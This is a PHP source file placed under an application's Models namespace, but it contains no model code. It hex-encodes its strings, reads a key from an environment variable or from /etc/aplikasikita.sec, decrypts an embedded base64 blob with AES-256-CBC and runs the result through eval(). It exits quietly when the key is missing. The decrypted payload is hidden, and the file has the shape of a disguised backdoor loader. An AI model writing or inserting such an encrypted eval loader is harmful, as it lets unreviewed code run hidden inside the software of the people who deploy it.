<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('pTSu7c0Xa3pmmnfvbm7xRQ==');

$c=base64_decode(

'wYJxjSFVERru3rijwN67elhHrylIpdqFNgSU9xmPLiaYTccHXWgwPFGSnSg2zrVpvxUixUfEkHXQ' .
'zJsogYa9n3t/nn2s28WPEht04GlM6HJ73wiW7s06ZZFlf7zahji7JXSWZBtRWNideQvW7Mv8Nfd+' .
'Ky7BFSKYAY/ZRydwJmcfvUPXDc1/2sfYxhOpCb7N/OFGK3vBPAD3aJx+B0G/F1wp7dgTZo2XhbBO' .
'Jz/JMy+L9J8Pdgk8gYK2nqHjy58X7SE/YWArBCUmtvE09G3UXxnBxHZhT+nMpZZRNt3YW1IjUNBJ' .
'4UhOyzbjQzc0TSRTkfNRWXQDRq4q69ngrbp9sRyuT2DliNrpt67+7RLFGa3jBYCPHQVY1KH+bHFs' .
'O1LUCorEvsoECwCqT0a6dJsr2SxnF68u9bROOJU7YytChDHG71oCiTcmCFWtUGJbmpBwk4DrgcCs' .
'EYODgGuZmkPZquQflQ/1hWwxZCiTD5GUGZY0tmpfvqkplwXhd1CanHvtv3rg3kJ7ateOlOaovhD7' .
'Lobe9s29H0gi4q1tmyzK2GXpVOdtrKDUOHpcfzPj5TS7vAryeVj/dKbDvuUPN8vIHKjinFgklIUC' .
'joKBQIE1hjZLJEQsN6cHU1u/nT3FZe9/Qh/N2ttXACxWN75PIx3aWFoU05kpV+6UY2lZMfvOuJUf' .
'chr8xGjixsuJJ6MNVj+YIL8wUibkXHQd+MfZgzhc7eqTRiMQeJFVb18raq7YHL446rMMhC1zhzR8' .
'4EmTH7E7+SnOYtzFWOXELJ3VQ4hU7nHdNQdoiOy1BkRJ9He64NR7tpqXKWwY+2ev7Nnk1sMhc0MA' .
'KwSvTQ7F5NXJL4Lio2svCOe5ZoEjT+lN6ifAonFqleVeLo27aqM04u3Nx3G3H3LAuaPuefrl9vbj' .
'pmWkKcsGJHV1s2WTNq0Z4lEAsOxdtddis6KELo1l5eEg7ry7+JjEw9CJSCIzFdKab9RQD9zuWqgh' .
'2f85cxZ5PTGAnpGZV1BAkGyEVrzopbGILK3Vlay6/cpGkNP4zerkSbV2Y+vlIFj7z8VurQD1TNCL' .
'Ao/6HXD38L4ubePqFMf7UR+RQ9W1lOJS7Hfypn1vaz7dLsuO1HITowamI9JyXM2qwwU9VAhGBzY9' .
'lld7OBHIQ4N4CnWei/jLiA4uXfbEDELVtqqcFB9CHkNCh/htUj6gE8orAVugE89nyw3tzFfI+s7H'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

